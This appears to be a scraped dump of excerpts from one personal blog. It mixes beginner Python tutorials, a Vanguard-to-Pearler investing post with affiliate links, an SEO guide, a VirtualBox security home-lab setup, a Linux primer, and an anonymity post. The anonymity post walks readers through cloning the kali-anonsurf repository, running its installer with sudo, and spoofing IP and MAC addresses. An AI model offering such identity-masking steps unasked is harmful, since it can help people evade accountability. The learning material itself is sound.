main() Reflection (WIP) How defining functions work, still getting my head around flow control, this helped to see a function on later lines can be called on eariler on in the program.\nI don’t always need to use elif, I’m still getting the hang of if statements, so it’s nice to see how you don’t always need to use elif.\nThe question about why numDigits errors when the number is over 10, that’s because there’s only 0 through to 9, there’s only 10 digits to choose from.\n","permalink":"//localhost:1313/bagels/","summary":"Want a beginner Python Project that’s going to test you?

For more Python projects, see Is It Raining? and Guessing Game.\nPseudo Code It’s a good idea to plan out your program, no matter the size!\nPseudo Code helps out-think like the program, step by step, how will the computer interpret your written instructions?\nHere’s the PS Code for the Mad Lib game:\n# Mad Lib Game # 1 Display title # 2 Ask for name various inputs # 3 Display combined output It’s very simple, but it works really well.\nGive your program a simple title followed by an outline of steps required for the program to operate. In this case, there’s really two important steps, #2 Asking for input, and #3 displaying combined output.\nAlso, make up your Mad Lib sentence, I made a fictitious scenario like so:\n# Yesterday, {name} walked into a {place}, I noticed they we\u0026#39;re {verb} and had a {noun}. \u0026#34;How strange? I thought\u0026#34;. So I asked them, what are you doing? They responding, \u0026#34;I\u0026#39;m {adjective}\u0026#34;. Okay then... # And then today, I saw {name2}, at the most {adjective2} {place2}. They we\u0026#39;re {adverb} {verb2}... isn\u0026#39;t that {adjective3}! Lastly, let’s display the title of the game for the player:\nprint(\u0026#39;\u0026#39;\u0026#39;Welcome to the Mad Lib Game. You\u0026#39;re going to receive a series of inputs, type whatever you like. Ready? Great! \u0026#39;\u0026#39;\u0026#39;) Something of interest here, is three single quotations allow for multi-line strings, it’s good for writing larger sentences.\nUser Input Now the player has seen the game title and instructions, let’s get their input.\nBelow is the following code for names, places, verbs, nouns, adjectives and adverbs:\nname = input(\u0026#39;Enter name: \u0026#39;) place = input(\u0026#39;Enter place: \u0026#39;) verb = input(\u0026#39;Enter verb: \u0026#39;) noun = input(\u0026#39;Enter noun: \u0026#39;) adjective = input(\u0026#39;Enter adjective: \u0026#39;) name2 = input(\u0026#39;Enter another name: \u0026#39;) adjective2 = input(\u0026#39;Enter another adjective: \u0026#39;) place2 = input(\u0026#39;Enter another place: \u0026#39;) adverb = input(\u0026#39;Enter an adverb: \u0026#39;) verb2 = input(\u0026#39;Enter another verb: \u0026#39;) adjective3 = input(\u0026#39;Enter another adjective: \u0026#39;) Each input function is assigning user strings to a variable with a logical name. When variables doubled up, simply add a 2, or 3 to avoid multiple variables with the same name.\nIf you’re like me, and barely passed English in school, then here’s a quick reminder of each element.\nNoun, a place, person or thing, e.g. decision, creation or sadness. Verb, a doing word, e.g. decide, create or sadden. Adjective, a describing word, e.g. decisive, creative or sad. Adverb, describes verbs, e.g. decisively, creatively or sadly. Output Great, so now the user has filled in their Mad Lib inputs, now it’s time to display the output:\nprint(\u0026#39;Great work, here\\\u0026#39;s the Mad Lib:\u0026#39;) print(\u0026#39;Yesterday, \u0026#39; + name + \u0026#39; walked into \u0026#39; + place + \u0026#39;, I noticed they we\\\u0026#39;re \u0026#39; + verb + \u0026#39; and had a \u0026#39; + noun + \u0026#39;. \u0026#34;How strange?

And it’s fun! My wife and I spent ages putting our friend’s names, celebrity names and others into wacky situations.\nIt’s the sort of project that isn’t too mind-bending for a beginner while also being enjoyable, a great mix while starting the python programming journey.\nI think to make the game more complex, there could be a menu system introduced. The player could select from various sentences, they could play a short and simple game or a longer one.\nThere also could be a help menu introduced, at any time, if the user enters ‘help’, a list of explanations of nouns, verbs and adjectives could display.\nEven the ability to go back would be a great addition, I noticed my wife entered a noun as a verb accidentally and wanted to change it before continuing. A back option would make that work well.\nOverall, it’s simple and works well, perfect to pick up and try yourself while starting out with Python.\nThis is Day 22 of #100DaysOfHacking, subscribe to the newsletter for updates and if you have feedback, message me via Twitter.

We all have to start somewhere.\nThere’s a lot of good places to learn Python, I recommend Automate The Boring Stuff with Python and the official Python Documentation Tutorial.\nIf you’re learning to hack in the Cyber Security space, see Hackers Learning Path. For some project ideas, try Guessing Game and Is It Raining?\nDisclaimer, you’re expected to have basic computing and operating system skills, ideally Linux.\nMindset: How To Python Think about Python like any language, take English for example. There’s rules around what words can be used, their meaning, the structure of sentences and more.\nAll these elements are predefined and make it possible for us to learn and communicate with fellow English speaking humans.\nPython is the same concept, you need to learn the rules, meanings and structure to communicate, or, create a program. Instead of humans, programming languages like Python are designed to communicate with computers.\nA couple of other notes, programs are a series of instructions, programmers don’t need to know much math, you’re never too old to learn programming and programming is a creative activity.\nSetup: Starting With Python Start at python.org and download the latest version of the language, then use the Beginners Guide to see the options at work. Next, download a code editor, aka IDE, there are lots of options out there, I recommend Visual Studio Code. For more on Python, see Python in Visual Studio Code.\nOnce vscode is installed, install some extensions, use CTRL + SHIFT + x and type python it should be the first search result, just double check it’s the official extension from Microsoft.\nWhile you’re there, optionally install Beautify and GitHub.\nOkay, let’s set up your folder structure, press CTRL + K O, create a new folder where ever you like, if you’re unsure, go to Documents and call it Intro To Python - Mr Ash.\nNow, let’s create your first python program, press CTRL + N to create a new file, then name it hello.py. The py is the python file extension, vscode will automatically detect it’s a python file and save it as so.\nNow, line 1, type out print('hello, world...') – this is a tradition in programming. We’ll break down what is happening, but for now, just type it out and hit CTRL + S to save the file.\nLet’s execute (or run) our new program and see the output. Type `CTRL + “ (that’s a tick back, it’s on the top left of your keyboard) to bring up the terminal.\nType CTRL + SHIFT + P to show the Command Palette, then type python run and hit enter on Python: Run Python File in Terminal, thanks to this article for your help.\nYour output should be the following:\nIf something is wrong, that’s okay, welcome to bug squashing. There’s something wrong with your code, it’s not running as intended, it may be something small, like a spelling error or depending on the size of your program, an entire misconfiguration.\nIf all is well, great! Your first program is complete, congrats.\nThe program you just built is using is an expression, with the function print with a string value. I know this doesn’t mean much right now, just stick with me.\nPython has built-in functions, they’re like pre-built programs inside your program. It allows you to not have to write EVERYTHING from scratch. So, print() is the function that prints out, it’s followed by brackets, anything inside those brackets is considered an input for the function.\nIn this case, we’ve passed 'hello, world...', now this is a string, one of the most common data types, we’ll talk more about data types soon. Think of a string like a normal sentence, a mixture of characters including letters, spaces and/or numbers. You could put almost anything into a string, just make sure you have formatted it as so, 'string goes here'.\nOkay, still with me? Great!\nBasics • Core Python Elements Okay, to see Python in action, we’re going to change it up slightly. Instead of creating a new file, we’re going to use an interactive shell, you’ll see what I mean.\nBring up the Command Palette with CTRL + SHIFT + P, and type python start, then select Python: Start REPL, REPL is short for Read, Eval, Print and Loop, read more if interested, and thanks to this article.\nIt might take a second, but you’ll notice the terminal change, this is the interactive shell.\nTry your previous program, now all in one line print('hello, there...') and hit ENTER. You should see your string printed on the next line.\nIf you’re wondering, you don’t write complete programs here, this is for testing purposes and learning, like us!\nOkay, type a new expression 2 + 2 and hit ENTER, I bet you can guess the output.\nLet’s break down what’s happening. This expression includes two values, 2 and a single operator, +. The 2 values have an Integer data type, more on them soon, I promise.\nPython evaluates to a single value, in this expression it’s 4, but no matter how complex a python program is, it always evaluates to a single value. You can always make a value evaluate to itself, simply type 2 and hit ENTER. For more, see Using Python as a Calculator.\nOkay, so let’s learn some more elements that make up Python, we’ll do this by writing another small program.\nYou can switch between shells, or terminals, by selecting Python on the right.\nThe best way to start is always with pseudo code, this is like a plan or outline for what you expect the program to do.\nSay hello, ask for name. Print hello with name. So here’s the following program:\nprint(\u0026#39;Hello, world...\u0026#39;) # Print hello name = input(\u0026#39;What\\\\\u0026#39;s your name? \u0026#39;) # Ask for name print(\u0026#39;Hello \u0026#39; + name) # Say hello with name Don’t forget to use the Command Palette to run the program, CTRL + SHIFT + P and type run.\nThe program will say hello, ask for your name and then say hello again with your name.\nLet’s break this down, if you see # anything after is a comment, this is for humans, not computers. The python interpreter will see and ignore comments.\nNext, on line 2, name is a variable, we could call the variable any title, but because the word name easily describes what’s stored in the variable, it’s a good title for it.\nThink of variables like a box, we can store any value or data type inside of it. In this program, we’re storing the input from the user. input() is another built in function like print() but as you experienced, it’s waiting for user interaction or input.\nLine 3, uses print() again but this time it’s using string concatenation, big word, it just means to combine multiple elements.\nVisual Studio Code is great, like most code editors, it automatically colour codes each element of your program. In my case, variables are blue, comments are green, functions are yellow, string data types are orange and white is general syntax. Syntax just means the brackets and characters that Python uses to understand what we’re telling it to do.\nLet’s learn some new data types and add them to our program. Add the following to lines 5 and 6:\nage = input(\u0026#39;What\\\\\u0026#39;s your age: \u0026#39;) print(age) So we’ve added a new variable called age, it’s now going to be an integer data type. Integers are whole numbers like 20, 21, 50 etc.\nThe output for age should be whatever you type in when asking. Now let’s use some more concatenation, let’s edit line 6 to look like the following:\nprint(\u0026#34;You\u0026#39;re \u0026#34; + str(int(age) + 1) + \u0026#34; next year.\u0026#34;) Let’s take a look at what we’ve added here. We’re using two functions inside of our print() function, there’s str() and int() these are known as conversion functions. Meaning, anything that get’s passed through them will be converted into their data type. This is important when we want to combine multiple data types. Python needs to know each data type, and they need to be converted into a string.\nSo the age variable is converted into an integer, a whole number, it adds one, and then it’s converted into a string, which is normal characters, then it’s combined with the other strings to form an entire sentence.\nRemember, Python always evaluates to a single value.

I just made the move.\nThe Vanguard platform gets the job done, but Pearler has the style with more features and a clearer development roadmap. If you’re new to investing, see Beginner’s Guide To Passive Investing.\nLet’s look at what’s involved in switching investment brokers.\nDisclaimer, this is not personal financial advice. If you’d like to support the blog, consider signing up with Pearler via this link.\nVanguard vs Pearler – Why? Let’s quickly go over why Pearler is worth switching to from Vanguard.\nIn 2021, Vanguard updated its pricing model to match other “every day” broker’s.\nThey charged $0 trades, now, $9 per trade, most brokers are around this price point. Pearler charges $9.50 per trade, so very similar.\nUpdate, Stake has come on the scene reportedly charging $3 per trade for ASX trades.\nHere’s a look at Pearler vs other popular platforms.\nIf you keep the same investment strategy, i.e. you invest in the same Vanguard ETFs, then management fees are identical.\nI don’t invest in single stocks and shares, but from what I can see, there are the same options available, if not more.\nPearler also offers a variety of ETFs from companies like BetaShares, VanEck and more. If you’re looking at ETFs outside of Vanguard, then Pearler is a no brainer.\nReasons – Vanguard to Pearler The biggest reason to switch from Vanguard to Pearler comes in the functionality of their platform.\nAt the time, Vanguard did not have an Android app, not a deal-breaker in itself. As mobile-friendly as their website was, it would log out quickly and provide an annoying experience. The platform itself was very basic, just offering trades with minimal assistance or innovation.\nPearler is a fresh breath in the investment brokerage scene. They’re still a start-up company, so they’re new and there’s a lot ahead for the platform. The main features are:\nThe mobile app, a clean experience. Joint accounts, the ability to share investments with a partner. Auto-invest, as the name implies, is automatic investing. Socials, ability to see other investment strategies. Also, be aware that Pearler is a new company in the investment space. Compared to Vanguard, a much older company built by John C Bogle years ago. Generally, newer companies can innovate and adapt faster but have a higher risk of attaining success.\nA big difference is how Vanguard and Pearler are structured. Vanguard is a custodian broker and Pearler comes under CHESS. This means Vanguard technically owns your stocks and shares where Pearler does not, you do.\nDespite Pearler being a smaller, newer company, their structure and outlook make them a clear winner for investing.\nAnother difference comes in how each broker handles dividends, more on that soon.\nMaking The Switch to Pearler Great, now we’re ready to make the switch from Vanguard to Pearler, let’s go.\nStep 1, set up a Pearler account by following this link and the on-screen instructions. It’s painless, just have your driver’s licence on hand and follow the prompts.\nStep 2, transfer stocks. Don’t sell your shares on Vanguard, withdraw the cash to your bank, then deposit the cash to Pearler and THEN invest. You’ll be hit with multiple trade fees, especially if you’re investing in the same ETFs, you can simply transfer.\nGo to Vanguard and complete this form, then contact their support and explain you’d like to transfer. They’ll forward that to the team responsible for this who will get you to complete another form confirming the details, then you’re all good.\nStep 3, wait for transfer. This process can still take a couple of weeks depending on the back and forth. If you need the money fast, you can always sell, just be aware of those added fees.\nDividends via Pearler Step 4, set up dividends. Yeah, this step gets its whole dedicated section.\nDividends are payments from companies you hold shares in. The company e.g. Apple, decide how much from their profit they can spare to investors.\nCurrently, dividends cannot be paid into your Pearler cash account. Instead, you can nominate (via the share registry for your stock) whether to pay it directly to your bank account or nominate it for dividend reinvestment.\nA ‘share registry‘ is an organisation that, on behalf of a company, manages the registry of shareholders for that company. For example, ETFs VAS and VGS use Computer Share as their share registry. So, sign up for an account, follow the prompts to get set up.\nNow it’s up to you and your strategy, do you want an income from dividends? Would you like to reinvest them?\nClick the My Profile button located on the right-hand side of the Investor Centre home page and then click on the ‘Update’ button under ‘Reinvest Dividends’ and follow the prompts. Or, go to My Profile, Reinvestment Plans, Select ETF, Apply Full Participation.\nThis is known as DRIP. Instead of receiving dividend payments via cheque or into a bank account, Computershare’s DRIP enables the shareholder to buy additional shares with dividend payments and build their portfolio.\nSharesight – Integrated with Pearler (TBA) Step 5, set up Sharesight. This is something I’m yet to do, so I’ll come back to this soon. Basically, as I understand it, Sharesight is great for tracking your investments for tax purposes. As I said, I’m yet to do this and I’ll be back.\nPearler – Final Thoughts Pearler looks to be an amazing platform in the making. Given it’s still new to the space, the team have done an incredible job so far building a platform and community.\nI haven’t mentioned the team behind Pearler enough! They’re fans of the Barefoot Investor and the FIRE community. That lays the groundwork for a platform built right for the long term Aussie investor. They don’t encourage gambling like games, it’s the true, slow growth to Financial Independence (FI).\nSubscribe or follow me for a full review of Pearler, I’d like to go through with a fine comb and look at everything Pearler is doing right and wrong.\nIf you’d like to support the blog, please consider signing up to Pearler via this link.\n","permalink":"//localhost:1313/pearler/","summary":"Great!

I’ll be condensing these, plus adding my experience from web design and digital marketing.\nThis is my beginner’s guide to SEO for blogging in 2021. I wish I had this year’s ago. Well, my Dad did buy me a Google Search magazine a long time ago, maybe I should’ve just paid more attention, whoops, sorry Dad.\nDisclaimer, I’m not an SEO expert nor do I claim to be. I’m simply sharing my experience and mixing in some other learning materials. This guide is geared toward a personal blog compared to an e-business.\nMindset to SEO What is a search engine? Google Search is an example of one, but it’s not the only one. There are others out there, believe it or not.\nHere’s a search engine in steps:\nA user types ‘search term’ e.g. kittens; the search engine looks through its database; shows search results e.g. web pages full of kittens. Put simply, a search engine is a computer program that takes data and organises, or indexes data into a database. The data that web-based search engines index, are web pages, more on that soon.\nSEO is the practice of making changes to a collection of web pages, or a website, to better rank on search results, a.k.a increase search rankings. Webpages are most commonly in the format of blog posts.\nSEO is not a science, it’s a trial and error game as no one completely understands the search engine algorithms. No matter what the SEO guru’s tell you, no one is truly an SEO expert.\nSimple, right? So webpages or blog posts are what search engines care about and index, this is the main focus of SEO. Optimizing the text and words, or your writing, for both human readers and search engines, or as I affectionally call them, robot readers.\nFor more on SEO mindset, read or watch How to Think About SEO and read or watch SEO Myths.\nHow do you set up your website and blog posts?\nThis isn’t a step-by-step guide, but I recommend using WordPress on a managed host like CloudWays. Build with Elementor, set up metadata with Yoast or All in One SEO. Then set up Google Analytics and Webmaster Tools, optionally, use Google Workspace. Lastly, set up caching using Breeze and a CDN via Cloudflare.\nFor more, read Setting Up Your Blog for SEO or my Setup Your Own Website.\nSEO Topics To write blog posts for humans and robots, nurture your writing skills.\nEither you; 1) love writing, or 2) are new to writing/publishing online.\nIf you love writing, great, if you don’t, learn too.\nThe best way to do this is to write every single day. I have for over a year now, yes, full 365 days and counting. I finally love it.\nOkay, so you love writing, or you will love it one day, now what?\nWell, write for others.\nWhat do you write about? Find the balance between, 1) topics you like or care about, and 2) topics people are searching for online, more on this soon.\nIf you’re focused on something you enjoy, you’re more likely to create quality content. But, if no one is searching for that content, what’s the use?\nThis does raise the difference in content, you can write for, 1) Discovery, 2) Community, or 3) Sales.\nThis guide to SEO is focused on discovery content, meaning, articles that people are searching for. If you’re writing for the love of writing or for a newsletter, then it’ll sit under the Community banner. Then there’s Sales, which as the name implies, it’s to simply sell.\nHow do you write about topics you like and care about? Build a process, I’ll share my Notion Template, it’s my process.\nWhen finding, or choosing topics, there are three areas to consider, 1) things you know, 2) things you’re excited about, and 3) things you believe.\nNow, are people searching for what you care about? More on this soon, I promise.\nFocus on answering people’s questions. If you can answer questions or solve problems better than anyone else, you’ll find an audience.\nIf you’re writing about an existing topic, there’s most likely a lot of content, meaning high competition. If it’s a newer topic, it’s likely to have low competition.\nYou provide a solution, an answer to a question or what someone needs to know about something.\nKeywords for SEO Let’s turn our focus to the people who are searching for your blog posts, I told you I’d get to this.\nWhat are they typing into that search box?\nThose are search terms, or in the SEO world, keywords.\nThe term ‘keywords’ indicates the key words in your blog post match the search terms from users.\nLet’s look into finding keywords, this is how to verify the topics people are searching for online.\nto find the right keywords, either have an article written or an idea for one. For example, I wanted to write this blog post Guide to SEO, so that’s the keyword target. use an SEO tool like SE Ranking or Serpstat to pick a top-level keyword and get ideas. enter top-level keyword, then, filter and sort results based on, 1) Volume and 2) Difficulty. The goal here is to find high volume keywords with low difficulty. Filter difficulty by 0 to 30 and sort the results by ascending volume. Start with medium volume and low competition, this is considered easy. Then, over time go broad with large search volume and higher competition, this is more difficult. set up a new spreadsheet and start building a list of easy keywords with low competition and some-what good search volume. This can take time and be frustrating, don’t worry. Do this as many times as you need. Build a list of 5-10 keywords for your post. update or write your article to use these keywords, then, use your SEO tool to track your post with the new keywords. This is how you monitor how well your post is ranking. For more, read or watch Find Keywords For Your Blog.\nSEO Writing To rank well, write well.\nRanking focuses on search engines, or robots, whereas writing focuses on the reader or humans.\nFind the balance between writing for these two. How? You guessed it, a good process:\nset an article goal, which is usually to answer a question and provide the best answer making it complete; nothing left out. write the character journey by identifying who the reader is, what they want and how your article helps them. Write a hook to capture the reader’s attention. Tell a half-told story, use questions, discoveries, arguments, unique illustrations or introduce topics. research the current top results by searching your target keyword. Write a simple list of patterns like writing styles and terms used. outline the topics. Write in order to think here, first drafts are supposed to be messy. The goal is to provide value, which means retain attention and show what you care about or your perspectives. finish with a strong conclusion and Call To Action (CTA), this makes it actionable to convert. rewrite and include internal links, high authority articles like Wikipedia and keywords. write an attention-grabbing headline. The headline should include the article’s keyword. over-deliver and provide free downloadables a.k.a freebies. Some common terms and tactics you’ll see while researching SEO are not worth your time. Like having other websites link back to your website, this is backlinking and it isn’t required. Also, keyword stuffing is dead, don’t jam keywords into your posts for no reason.\nFor more on writing, read Writing Well, for more on ranking, read Write Content that Ranks.\nPromoting, Metrics, and Traffic Once you’ve finished your article, it’s time to share. This is known as promoting content to your audience. It doesn’t matter who to start with, just get an initial bump in views, so share with friends and family!\nNext, promote to others, find SubReddits, Facebook Groups or Forums your ideal reader is hiding. Email people you think would be interested or send a blast email to your mailing list.\nOver time, add structure to the site, update the post by adding links to new articles on old articles on your site. Use an SEO tool like SE Ranking to track keywords and rankings.\nFor more, read Promote Your Content, SEO Metrics and Double the Traffic.\nSo, that’s it, that’s your guide to SEO as a beginner 2021.\nHow are you learning SEO and growing your blog?

Here’s a visual guide for the lab:\n*Disclaimer, this does not contain 100% of the steps of this project.\nIntro Ideally, use a dedicated lab computer for this, a spare laptop or an old gaming PC. Spec-wise, 4-8 Core CPU, 16-32Gb RAM, 500Gb+ HDD is recommended.\nLet’s get everything you need for the lab. You’ll be downloading an EXE file i.e. an application and some ISO files, these are disc image files. Start by creating an ‘Image’ folder to store everything in.\nDownload and install VirtualBox (VBox), this is the hypervisor we’ll be using to virtually simulate the network. If this is your first time, follow the User Manual provided. If you’re familiar with virtualisation software, feel free to use VMWare or Hyper-V. Read this if you’re having VBox issues, it’s worth disabling Hyper-V.\nI’m assuming this will all be done on a Windows 10 64-bit desktop.\nGet a pfSense ISO (AMD-64bit), this is the network segmentation, dynamic host control protocol (DHCP) and firewall. Next, download Security Onion ISO, this is for intrusion detection system (IDS), monitoring, and logging.\nGrab an Ubunutu Desktop ISO, an Ubunutu Server ISO and a Kali Linux ISO, these are Linux operating systems. Then get a Windows Server ISO and Windows 10 ISO.\nLastly, get a license for Splunk, sign up and you’ll (most likely) get a free developer license via email within a day or two.\nSomething I noticed in the original tutorial, NAT adapters get used, I don’t think this is required. You’ll see below all the network adapter configs for each VM.\nSetup Open VBox and start creating VMs, use a logical nomenclature, like ‘lab1’ as a suffix e.g. l1-pfs, l1-kali etc. It keeps things organised.\npfSense (l1-pfs)\nUse the following settings:\nType: BSD, Version: FreeBSD (64-bit) 2Gb RAM, 1 Core CPU, 20Gb HDD Adapters (NICs): Adapter 1: Bridged, Adapter 2: Internal, l1-vlan2, Adapter 3: Internal, l1-vlan3, Adapter 4: Internal, l1-vlan4, Adapter 5: Internal, l1-vlan5, Adapter 6: Internal, l1-vlan6. IP: 192.168.1.1 You’ll need to add extra NICs, you can add up to 4 using the GUI and 8 in total via CLI. Open CMD/PowerShell/Terminal, navigate to where VBox is installed and edit the NICs. Use the commands below to assist:\nChange directories: cd C:\\Program Files\\Oracle\\VirtualBox Show VM info: .\\VBoxManage showvminfo l1-pfs Set nic5 to internal: .\\VBoxManage modifyvm l1-pfs --nic5 intnet Set nic5 to l1-vlan: .\\VBoxManage modifyvm l1-pfs --intnet5 l1-vlan Set nic6 to internal: .\\VBoxManage modifyvm l1-pfs --nic6 intnet Set nic6 to l1-vlan: .\\VBoxManage modifyvm l1-pfs --intnet6 l1-vlan Once the NICs are turned on, they can be edited via GUI of the VM.\nOnce you’re done with that, follow the CyberWox tutorial for all the details.\nAfter setup, It’s worth adding in firewall rules for each NIC as you’ll run into problems later. Firewall \u0026gt; Rules \u0026gt; Add \u0026gt; Any Protocols \u0026gt; Save \u0026gt; Apply.\nThanks to How2Shout and SuperUser.\nKali (l1-kali)\nType: Linux, Version: Red Hat (64-bit).

Beginning Linux is hard.\nThere’s a lot of free courses and content to help you. But what about a quick start guide to Linux? Getting started with Linux made easy?\nNo fluff, just a quick and dirty setup to get you started with Linux basics! Well, here it is, the Linux Quick Start Guide. To follow along, install Ubuntu Linux and let’s learn how to get started with Linux.\nDisclaimer, this is an ongoing piece of content and is not finished.\nIntroduction Linux is an open-source operating system with an interesting history and important philosophy.\nLinux is built from UNIX by Ken Thompson, Dennis Ritchie from AT\u0026amp;T in 1970. This led to the GNU project (free Unix-like OS) by Richard Stallman in 1983 under the GPL, and then the first open-source Linux kernel by Linus Torvalds in 1991.\nThe Linux Philosophy is simple, 1) everything is a file, 2) small, single-purpose programs, 3) chain programs together for complex tasks, 4) avoid captive user interfaces and 5) configuration data stored in a text file.\nGiven its open-source nature, there are countless operating systems built on Linux known as Linux Distributions. Ubuntu is generally considered the most beginner-friendly distro, see this guide for help setting up Linux virtually. This quick start guide refers to Debian-based commands, the UNIX ancestor of Ubuntu.\nCommands Linux embraces the Command Line Interface (CLI), so should you! Linux’s CLI or shell is called Bourne Again Shell (BASH), we’ll use a terminal emulator on Ubunutu (or your Linux Debian Distro) to interact with our computer.\nThe prompt, typically shown like user@device:directory$ is indicating your input from the keyboard. Unlike a Graphical User Interface (GUI), there are no visual elements to interact with.\nInstead, commands are used to execute programs that are defined by command [options] [arguments]. Their default behaviour displays a result but depending on what options and arguments are paired with it. Options (or Switches) alter the behaviour of output, while arguments specify command output.\nAn example of this is ls -la ~/Documents, ls lists files and directories (folders), with the -l option, it displays them as a tabled list and -a displays hidden files or directories. The ~ represents the user home directory and the /Docuemnts is the folder path to the Documents directory.\nUse hostname to display the device name and whoami to output your username. At anytime you can use the man to show a manual for a command, if there is no manual try the command followed by --help or -h. Try man ls or ls --help.\necho is used to print or write something to the terminal, try echo 'enter a sentence'. It’s very useful to chain together with other commands later. Use the up and down arrows to cycle through previsouly used commands, !! to run last command or run history to see all used commands. Try TAB to auto-complete commands or arguments.\nNavigation Let’s navigate the Linux filesystem, first use pwd to print working or current directory.\nUse cd to change directories and ls to list files in a directory. To specify what directory to navigate to, either use an absolute or relative path. An absolute path starts from the root directory, represented by / but a relative path starts from the current directory, represented by ..\nYou can use other short hand path navigaters like .. for the parent directory or ~ for the user home directory. If lost, cd ~ to go home and start again.\nTo copy a file or directory use cp but to move a file or directory, use mv. To make a new directory use the mkdir and rmdir or rm -r will remove them. To display files content, use cat which is short for concatenate. If it’s a larger file, use head to display the first part or tail to display the last.\ntouch will simply create a new file, then file will display the file type. To edit a file’s content, use a text editor like vi, vim or nano. Nano is the most beginner-friendly of the three.\nUse find to find files in directories and grep to search through the content of a single file. You can also use sort and unique to filter through the content of files.\nSystem Now you’re moving around, let’s find out some information about your system.\nLinux programs rely on other programs which are called dependencies. So programs and their dependencies are called packages. To manage Linux packages we need a package manager, we’ll use apt. It’s good practice to run apt update and apt upgrade with new systems to ensure it has the latest packages.\nTo install programs, use apt install \u0026lt;program\u0026gt; to remove, use apt remove \u0026lt;program\u0026gt;. Remember, commands execute programs and they often have the same/similar name.\nThe Linux filesystem is the folder structure, starting at root / there’s /bin for system commands, /boot with system boot information, /dev for device files to access hardware, /etc for system and application configuration files. Then /home for user sub-directories, /lib for shared library files, /media mounted devices, /mnt for temporary filesystems, /root the user root’s home folder. Then /sbin which includes executables for sys admin (binary system files), /tmp operating system and program temporary file directories can be cleared upon boot or without warning. Lastly, /usr contains executable library and manual files, /var Variable data e.g. log files, email, web apps, crons \u0026amp; more.\nA program running or being executed is known as a process. To see processes on your Linux system, use one of the following command combinations: ps, ps -e, ps -ef, ps au or ps aux. PID is the process identifier, TTY is the name of the terminal, TIME total time of process and CMD command started process.\nTo turn off your system, use shutdown now or to restart, reboot now. You can also use these commands to shutdown/reboot at certain times, read the man pages.\nPermissions (Coming Soon)\nNetworking (Coming Soon)\nThis is Day 17 of #100DaysOfHacking, subscribe to my newsletter to follow the journey!\nIf you have any feedback, please send me a message @mrashleyball.\nHappy Hacking.\n","permalink":"//localhost:1313/quick-linux/","summary":"Learning Linux is fun!

It’s an incredible programming language to have in your tool belt.\nThis project is inspired by an early example from Automate The Boring Stuff with Python.\nFlow Control This python project is to impliment this flow chart:\nTaken from chapter 2, there’s a few things to digest, see the code step by step in Python Tutor.\nLet’s write the steps is psuedoe code:\nAsk if it’s raining? If no, go outside. If yes, ask if there’s an umbrella? If umbrella no, wait and ask if raining again. If umbrella yes, go outside. While Loop Let’s start with the outside variable and it’s while loop.\noutside = False while outside == False: # Other code goes here. print(\u0026#39;Go outside.\u0026#39;) exit() As all paths lead to outside, it makes sense for the program to check if the user can go outside or not.\nAs long as outside is set to False, the user isn’t able to go out. But once other conditions are met and outside is True, then the program ends.\nInput Validation Let’s make a simple input validation when asking if there’s rain or not. This way the user can’t put in anything but what is expected.\nWhile rain isn’t equal to y or n, continue asking the same question.\nrain = 0 while (rain != \u0026#39;y\u0026#39; or rain != \u0026#39;n\u0026#39;): rain = input(\u0026#39;Rain? y/n \u0026#39;) break if rain == \u0026#39;y\u0026#39;: # More code goes here elif rain == \u0026#39;n\u0026#39;: outside = True We’ll use this same input validation for our other questions that require user input.\nIf there is rain, the program will continue asking questions. But if there’s no rain, then outside is set to True and will break the original while loop.\nIf Else Statements Let’s add the last variable, umbrella.\numbrella = 0 if rain == \u0026#39;y\u0026#39;: print(\u0026#39;Get an umbrella.\u0026#39;) while (umbrella != \u0026#39;y\u0026#39; or umbrella != \u0026#39;n\u0026#39;): umbrella = input(\u0026#39;Umbrella? y/n \u0026#39;) break if umbrella == \u0026#39;n\u0026#39;: print(\u0026#39;Wait a while.\u0026#39;) elif umbrella == \u0026#39;y\u0026#39;: outside = True elif rain == \u0026#39;n\u0026#39;: outside = True Depending on the users input yes or no, either it will tell them to wait and then go back to the rain question or it will end the main while loop.\nFailed Attempts Just for a bit of fun, here are two of my failed attempts on the road to figuring out this program.\nVersion 2:\nrain = input(\u0026#39;Is it raining? y/n \u0026#39;) while rain == \u0026#39;y\u0026#39;: print(\u0026#39; if rain == \u0026#39;n\u0026#39;: print(\u0026#39;Go outside!\u0026#39;) else: break Version 1:\nraining = input(\u0026#39;Is it raining? y/n \u0026#39;) if raining == \u0026#39;y\u0026#39;: print(\u0026#39;It\\\\\u0026#39;s raining!\u0026#39;) umbrella = input(\u0026#39;Do you have an umbrella? y/n \u0026#39;) if umbrella == \u0026#39;n\u0026#39;: print(\u0026#39;Wait a while.\u0026#39;) print(\u0026#39;Time passes...\u0026#39;) raining = input(\u0026#39;Is it raining? y/n \u0026#39;) if raining == \u0026#39;y\u0026#39;: print(\u0026#39;Wait a while, again.\u0026#39;) else: print(\u0026#39;Go outside.\u0026#39;) else: print(\u0026#39;Go outside.\u0026#39;) else: print(\u0026#39;\u0026#39;\u0026#39;It\\\\\u0026#39;s not raining!

No, we’re not joining a hacktivist group here.\nLet’s learn the basics to cover ourselves online. We’ll be using Kali Linux in this example, here’s my guide if you need help getting set up.\nFor a wider approach to online anonymity, see Kalle Hallden’s Become Invisible Online.\nSpoofing an IP Address with anonsurf IP or Internet Protocol addresses are one element that makes sending and receiving data possible via our global internet infrastructure.\nIt gives a (somewhat) unique address that looks like 192.168.1.101 which makes identifying your device possible.\nThe term IP spoofing, defined as “deception or ruse” means to trick or change your unique address for other devices.\nReady to deceive devices? Ruse the robots?\nBefore we do, get your current Public IP, this is the real unique address for your home router. It’s how your ISP (Internet Service Provider) connects you to the larger internet infrastructure.\n*Do not share your real Public IP with anyone, EVER!\nLet’s go!\nWe’ll use git, version control software, to clone a repo (folder) to our desktop, so ls there.\nMake sure it’s installed by running git --help, if nothing’s there, then sudo apt install git on your Linux machine to get it.\nNow let’s grab Anonsurf which “provides users with system-wide anonymization”, awesome!\nSetup is simple:\nClone: git clone https://github.com/Und3rf10w/kali-anonsurf.git Install: cd kali-anonsurf chmod +x installer.sh sudo ./installer.sh Use: anonsurf start or sudo anonsurf start That’s it! How cool is that? Test your Public IP again and you’ll notice it’s changed.\nMeaning, other devices we use to connect to web services don’t know where we are. I live in Australia, but any web server my computer visits tells them I’m in Germany. Cool!\nSpoofing a MAC Address with macchanger The MAC (Media Access Control) address is another important element that makes our devices talk to each other. Think of this as a more ‘burnt in’ type of IP Address, a bit loose, but just go with it for now.\nIt’s assigned to a NIC (Network Interface Card) from the manufacturer/vendor i.e. Apple, Intel etc. It looks like 08:02:07:a2:a3:f6, a bit different to the IP Address from earlier.\nWe already know what spoofing means, so are you ready to try it?\nAwesome!\nWe’ll use a tool called MAC Changer which can view and change MAC’s for 